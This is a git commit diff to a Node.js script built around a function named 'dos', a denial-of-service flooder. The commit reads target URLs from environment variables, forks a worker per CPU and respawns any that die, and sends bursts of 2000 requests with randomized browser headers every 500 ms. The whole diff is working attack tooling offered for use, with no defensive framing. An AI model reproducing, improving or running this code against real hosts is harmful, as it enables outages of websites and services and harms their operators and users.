6b9aa549878c01f92ba79d7f1b23c44929ec31b8
MaximBazadji <maximbazadji@gmail.com>
2022-02-27 14:51:00 +0200

    added dotenv support. added cluster support. changed default number of requests and qty

--- index.js
+++ index.js
@@ -1,5 +1,12 @@
 const req = require('request')
 const HeaderGenerator  = require('header-generator');
+const totalCPUs = require('os').cpus().length;
+const cluster = require('cluster');
+require('dotenv').config()
+
+const qty = process.env.QTY;
+const ms = process.env.TIMING_IN_MS;
+const sources = process.env.SOURCES;
 
 const headersGenerator = new HeaderGenerator({
     browsers: [
@@ -17,10 +24,9 @@ const headersGenerator = new HeaderGenerator({
     ]
 });
 
-const dos = (url, qty, ms) => {
+const dos = (url, qty = 2000, ms = 500) => {
     let ok = 0;
     let err = 0
-
 
     setInterval(() => {
         for (let i = qty; i--;) {
@@ -31,17 +37,36 @@ const dos = (url, qty, ms) => {
                     ],
                     locales: ["en-US", "en", "ru"]
                 }),
-            }, error => !error ? ok++ : err++)
+            }, error => !error ? ok++ : err++);
         }
 
-        console.log(`Results: 
-        Ok responses: ${ ok };
-        Error responses ${ err }`);
+        console.log(`
+        Result:
+        Ok responses: ${ok};
+        Error responses ${err}`
+        );
 
-        err = ok = 0
-
+        err = 0;
+        ok = 0;
     }, ms);
 }
 
+if (cluster.isMaster) {
+    console.log(`Number of CPUs is ${totalCPUs}`);
+    console.log(`Master ${process.pid} is running`);
 
-dos('http://localhost:3000', 500, 100);
+    for (let i = 0; i < totalCPUs; i++) {
+        cluster.fork();
+    }
+
+    cluster.on("exit", (worker, code, signal) => {
+        console.log(`worker ${worker.process.pid} died`);
+        console.log("Let's fork another worker!");
+        cluster.fork();
+    });
+} else {
+    sourcesForRequests = sources.split(',').map(el => el.trim());
+    for (const source of sourcesForRequests) {
+        dos(source, qty, ms);
+    }
+}
